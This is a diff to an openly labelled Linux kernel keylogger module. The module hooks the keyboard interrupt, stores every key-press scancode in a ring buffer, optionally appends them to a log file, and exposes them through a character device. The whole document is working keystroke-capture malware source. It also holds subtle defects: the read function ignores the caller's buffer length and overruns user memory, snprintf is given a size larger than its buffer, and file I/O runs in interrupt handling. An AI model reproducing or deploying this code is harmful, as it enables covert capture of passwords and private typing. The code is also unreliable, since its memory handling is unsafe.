@@ -39,12 +39,15 @@ static bool is_dev_opened = false;
 static char msg[BUF_LEN];
 static char *buff_Ptr;
 static bool deleted = true;
-static bool is_fwd_dir = true;
-static bool output_once = false;
+static bool output_once = true;
+static bool do_write_to_file = false;
+static int keys_pressed = 0;
+static int scancodes_was_read = 0;
 // }
 
 // Kbd part {
 static char scancode[1];
+static char stash[BUF_LEN];
 // }
 
 // reverse the given null-terminated string in place
@@ -156,18 +159,6 @@ void delete_content(void)
 	deleted = true;
 }
 
-void direction_backward(void)
-{
-	printk(KERN_ALERT "Back direction\n");
-	is_fwd_dir = false;
-}
-
-void direction_forward(void)
-{
-	printk(KERN_ALERT "Forward direction\n");
-	is_fwd_dir = true;
-}
-
 static struct file_operations fops = {
         .read = device_read,
         .write = device_write,
@@ -187,11 +178,18 @@ static irqreturn_t irq_thread(int irq, void * data)
 	char * sc = (char *)data;
 	char buffer[7];
 
-	if (!(sc[0] & 0x80)) {
-		struct file* outputfile = file_open("/home/kez/log", O_RDWR | O_APPEND | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
-		snprintf(buffer, 6, "%#04x ", (unsigned int)(*sc));
-		file_write(outputfile, 0, buffer, 5);
-		file_close(outputfile);
+	if (!(sc[0] & 0x80))
+	{
+		if (do_write_to_file)
+		{
+			struct file* outputfile = file_open("/home/kez/log", O_RDWR | O_APPEND | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
+			snprintf(buffer, 6, "%#04x ", (unsigned int)(*sc));
+			file_write(outputfile, 0, buffer, 5);
+			file_close(outputfile);
+		}
+
+		stash[keys_pressed] = 0x7f & sc[0];
+		keys_pressed = (keys_pressed + 1) % BUF_LEN;
 	}
 
 	printk(KERN_ALERT "[KEYLOGGER] Scan Code1 %#x %s\n", sc[0] & 0x7f, sc[0] & 0x80 ? "Released" : "Pressed");
@@ -224,7 +222,7 @@ void cleanup_module(void)
 	free_irq(1, &scancode);
 
 	// Disable character device
-	printk(KERN_ALERT "[KEYLOGGER] Disabling kbd irq handling.\n");
+	printk(KERN_ALERT "[KEYLOGGER] Disabling character device.\n");
 	unregister_chrdev(Major, DEVICE_NAME);
 }
 
@@ -239,6 +237,8 @@ static int device_open(struct inode *inode, struct file *file)
 	is_dev_opened = true;
 	buff_Ptr = msg;
 	try_module_get(THIS_MODULE);
+
+	scancodes_was_read = 0;
 	return SUCCESS;
 }
 
@@ -251,29 +251,37 @@ static int device_release(struct inode *inode, struct file *file)
 	return 0;
 }
 
-static ssize_t device_read(struct file *filp,char __user * buff, size_t len, loff_t * offset)
+static ssize_t device_read(struct file *filp, char __user * buff, size_t len, loff_t * offset)
 {
 	int bytes = 0;
 	// char c; // unused variable
 	// int size = 0; // unused variable
 
+	const int output_buffer_size = 5;
+	char buffer[output_buffer_size];
+	int i;
+
 	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");
-	// TODO: Rewrite this function
-	if (*buff_Ptr == 0 || deleted || output_once)
+
+	if (scancodes_was_read == keys_pressed)
 	{
-		output_once = false;
 		return 0;
 	}
 
-	while (*buff_Ptr)
+	while (bytes < keys_pressed)
 	{
-		put_user(*(buff_Ptr++), buff++);
-		--len;
+		snprintf(buffer, output_buffer_size + 1, "%#04x ", (unsigned int)(stash[bytes]));
+		for (i = 0; i < output_buffer_size; ++i)
+		{
+			put_user(buffer[i], buff++);
+		}
 		++bytes;
+		++scancodes_was_read;
+		--len;
 	}
 
 	printk(KERN_INFO "Bytes read: %d\n", bytes - 1);
-	return bytes;
+	return bytes * output_buffer_size;
 }
 
 static ssize_t device_write(struct file *filp, const char __user * buff, size_t len, loff_t * offset)
